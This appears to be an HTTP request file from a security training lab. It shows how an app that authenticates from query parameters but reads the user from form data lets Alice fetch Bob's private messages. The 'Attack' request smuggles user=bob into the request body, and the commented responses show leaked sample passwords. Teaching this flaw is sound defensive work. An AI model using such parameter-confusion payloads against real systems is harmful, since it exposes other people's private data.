@base = http://localhost:8000/ii/cross-component-parse

### Expected Usage:
GET {{base}}/example8?user=alice&password=123456
#
# Normally, Alice would get her *own* messages:
#
# {
#   "owner": "alice",
#   "messages": [
#     {
#       "from": "kevin",
#       "message": "Hi Alice, you're fired!"
#     }
#   ]
# }
#

###

### Attack: Decorator authenticates using query params, handler uses form data
GET {{base}}/example8?user=alice&password=123456
Content-Type: application/x-www-form-urlencoded

user=bob
#
# Alice gets Bob's messages, even though she provided her own password!
#
# {
#   "owner": "bob",
#   "messages": [
#     {
#       "from": "kevin",
#       "message": "Hi Bob, here is the password you asked for: P@ssw0rd!"
#     },
#     {
#       "from": "michael",
#       "message": "Hi Bob, come to my party on Friday! The secret passphrase is 'no-one-knows-it'!"
#     }
#   ]
# }
